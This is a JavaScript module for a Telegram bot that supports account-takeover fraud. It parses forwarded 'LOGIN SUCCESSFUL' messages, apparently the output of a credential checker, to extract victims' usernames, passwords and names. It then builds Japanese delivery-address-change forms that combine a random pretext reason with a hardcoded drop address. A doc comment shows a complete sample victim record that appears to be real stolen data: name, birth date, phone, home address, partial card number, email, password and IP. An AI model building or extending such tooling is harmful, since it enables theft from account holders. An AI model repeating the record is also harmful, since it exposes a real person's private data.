/**
 * =============================================================================
 * FORWARD ACTION MESSAGES - Parsers and builders for forwarded-message actions
 * =============================================================================
 *
 * When a user forwards a "LOGIN SUCCESSFUL" message back to the bot, these
 * helpers parse the plain-text message and build the action prompt / address
 * change form.
 *
 * The forwarded message arrives as plain text (Telegram strips MarkdownV2
 * syntax; formatting is stored in entities).  The password — sent with
 * spoilerCodeV2 — is visible as plain text in the forwarded copy.
 *
 * =============================================================================
 */

const { escapeV2, codeV2, boldV2 } = require('./helpers');

// Import target address from addressManager for single source of truth
const { TARGET_ADDRESS } = require('../../shared/capture/addressManager');

// ─────────────────────────────────────────────────────────────────────────────
// Address-change reason variations (Japanese)
// ─────────────────────────────────────────────────────────────────────────────

const ADDRESS_CHANGE_REASONS = [
  '転居に伴い、お届け先を新しい住所に変更いたします。',
  '長期出張のため、一時的に別の住所へのお届けをお願いいたします。',
  '現在の住所では荷物の受け取りが困難なため、お届け先を変更いたします。',
  '家族の都合により、お届け先を変更させていただきます。',
  '引っ越し準備中のため、新しい住所へのお届けをお願いいたします。',
  '転勤に伴い、お届け先を新しい居住地に変更いたします。',
  '現在の住所での荷物受取ができなくなったため、お届け先を変更いたします。',
  '配送先を勤務先に変更いたします。',
];

// Destination from addressManager (single source of truth)
const DESTINATION_POSTAL_CODE = TARGET_ADDRESS.postalCode;
const DESTINATION_ADDRESS = `茨城県${TARGET_ADDRESS.city}${TARGET_ADDRESS.street}`;
const DESTINATION_PHONE = `${TARGET_ADDRESS.telFirst}-${TARGET_ADDRESS.telSecond}-${TARGET_ADDRESS.telLast}`;

// ─────────────────────────────────────────────────────────────────────────────
// Parser
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Parse a forwarded "LOGIN SUCCESSFUL" plain-text message to extract
 * credentials, name, and optional tracking code.
 *
 * The plain-text shape (after Telegram strips MarkdownV2):
 *
 *   ✅ LOGIN SUCCESSFUL
 *
 *   📊 Account Data
 *   ├ Points: 27534
 *   ├ Cash: 0
 *   ├ Rank: Silver
 *   └ Last Order: 2020/04/14 | 379388-20200414-00006703
 *
 *   👤 Profile
 *   ├ Name: 磯崎 真 (イソザキ シン)
 *   ├ DOB: 1983-12-01
 *   ├ Phone: ☎090-1903-4723
 *   ├ Address: 662-0855 兵庫県 西宮市 江上町8‐5‐501
 *   └ 💳 JCB ••••3042 (07/2030) SHIN ISOZAKI
 *
 *   🔐 Credentials
 *   ├ User: sin.bad@ezweb.ne.jp
 *   └ Pass: usiokusan1201
 *
 *   🌐 IP Address
 *   └ 125.49.129.6
 *
 *   📎 RK-12D8D984
 *
 * Edge cases handled:
 *   - Profile section entirely absent (capture failed)
 *   - Name without kana: `├ Name: 磯崎 真`
 *   - No tracking code (direct .chk output, not channel-forwarded)
 *   - User line with `└` instead of `├` (if no password present)
 *
 * @param {string} text - Plain-text content of the forwarded message
 * @returns {{username:string, password:string|null, name:string|null, nameKana:string|null, trackingCode:string|null}|null}
 *   Parsed data or null if not a valid success message
 */
function parseForwardedSuccessMessage(text) {
  if (!text || typeof text !== 'string') return null;

  // Must contain LOGIN SUCCESSFUL to qualify
  if (!text.includes('LOGIN SUCCESSFUL')) return null;

  const lines = text.split('\n');
  const result = {
    username: null,
    password: null,
    name: null,
    nameKana: null,
    trackingCode: null,
  };

  for (const line of lines) {
    const trimmed = line.trim();

    // ── User: ├ User: email  or  └ User: email ──
    const userMatch = trimmed.match(/^[├└]\s*User:\s*(.+)$/);
    if (userMatch) {
      result.username = userMatch[1].trim();
      continue;
    }

    // ── Pass: └ Pass: password  or  ├ Pass: password ──
    const passMatch = trimmed.match(/^[├└]\s*Pass:\s*(.+)$/);
    if (passMatch) {
      result.password = passMatch[1].trim();
      continue;
    }

    // ── Name: ├ Name: kanji (kana)  or  ├ Name: kanji ──
    const nameMatch = trimmed.match(/^[├└]\s*Name:\s*(.+?)(?:\s*\(([^)]+)\))?\s*$/);
    if (nameMatch) {
      result.name = nameMatch[1].trim();
      result.nameKana = nameMatch[2] ? nameMatch[2].trim() : null;
      continue;
    }

    // ── Tracking code: 📎 RK-XXXXXXXX ──
    const codeMatch = trimmed.match(/📎\s*(RK-[A-Z0-9]{8})/);
    if (codeMatch) {
      result.trackingCode = codeMatch[1];
      continue;
    }
  }

  // Username is the minimum required field
  if (!result.username) return null;

  return result;
}

// ─────────────────────────────────────────────────────────────────────────────
// Action prompt
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Build the "what do you want to do?" prompt shown when a forwarded success
 * message is detected.  The handler attaches the inline keyboard with
 * RECHECK and ADDRESS FILL OUT buttons.
 *
 * @param {Object} parsed - Parsed forwarded message data
 * @param {string} parsed.username - Email/username
 * @param {string|null} parsed.name - Kanji name (may be null)
 * @returns {string} MarkdownV2 message text
 */
function buildForwardActionPrompt(parsed) {
  const parts = [];

  parts.push(`🤖 ${boldV2('Forwarded credential detected')}`);
  parts.push('');

  if (parsed.username) {
    parts.push(`├ User: ${codeV2(parsed.username)}`);
  }
  if (parsed.name) {
    parts.push(`└ Name: ${codeV2(parsed.name)}`);
  } else if (parsed.username) {
    // Ensure the tree closes if name is absent
    parts.push(`└ Name: ${codeV2('n/a')}`);
  }

  parts.push('');
  parts.push(escapeV2('What would you like to do?'));

  return parts.join('\n');
}

// ─────────────────────────────────────────────────────────────────────────────
// Address change form
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Build the Japanese address-change form with a random reason and the
 * forwarded account's name.  Destination address/phone are hardcoded.
 *
 * Output is wrapped in MarkdownV2 inline code so the entire form can be
 * tapped to copy in Telegram.  No blank lines between sections.
 *
 * @param {string|null} name - Kanji name from the forwarded message
 * @param {string|null} nameKana - Furigana/kana name (may be null)
 * @returns {string} MarkdownV2 inline-code wrapped address change form
 */
function buildAddressChangeForm(name, nameKana) {
  // Pick a random reason
  const reason = ADDRESS_CHANGE_REASONS[
    Math.floor(Math.random() * ADDRESS_CHANGE_REASONS.length)
  ];

  // Build name display: kanji（kana）or just kanji if kana is absent
  const nameDisplay = name
    ? (nameKana ? `${name}（${nameKana}）` : name)
    : '';

  const parts = [];

  parts.push(`お届け先変更の理由：${reason}`);
  parts.push('');
  parts.push('・変更後のお届け先に関する情報');
  parts.push(`氏名（漢字、フリガナ）：${nameDisplay}`);
  parts.push(`郵便番号：${DESTINATION_POSTAL_CODE}`);
  parts.push(`住所：${DESTINATION_ADDRESS}`);
  parts.push(`電話番号：${DESTINATION_PHONE} `);

  // Wrap in inline code for tap-to-copy in Telegram
  return codeV2(parts.join('\n'));
}

module.exports = {
  ADDRESS_CHANGE_REASONS,
  parseForwardedSuccessMessage,
  buildForwardActionPrompt,
  buildAddressChangeForm,
};
